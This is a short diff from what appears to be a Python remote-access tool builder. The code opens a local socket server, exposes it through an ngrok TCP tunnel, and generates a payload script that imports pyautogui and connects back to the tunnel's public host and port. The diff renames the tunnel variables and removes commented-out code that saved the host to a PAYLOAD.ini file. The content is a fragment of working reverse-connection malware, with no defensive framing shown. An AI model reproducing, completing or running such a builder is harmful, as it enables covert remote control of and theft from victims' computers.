@@ -7,20 +7,14 @@ import os
 server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 port=8080
 host="127.0.0.1"
-X_ip,X_port=ngrok.connect(port,proto="tcp").replace('tcp://','').split(":")
-# conf=configparser.ConfigParser()
-# confile=open('PAYLOAD.ini','w')
-# conf.add_section('HostSection')
-# conf.set('HostSection','HOST',forwarded_ip_address)
-# conf.write(confile)
-# confile.close()
+ssh,ssh_port=ngrok.connect(port,proto="tcp").replace('tcp://','').split(":")
 script=f"""
 import pyautogui
 import socket
 import configparser
 import os 
-host="{X_ip}"
-port={X_port}
+host="{ssh}"
+port={ssh_port}
 print((host,port))
 server=socket.socket()
 server.connect((host,int(port)))
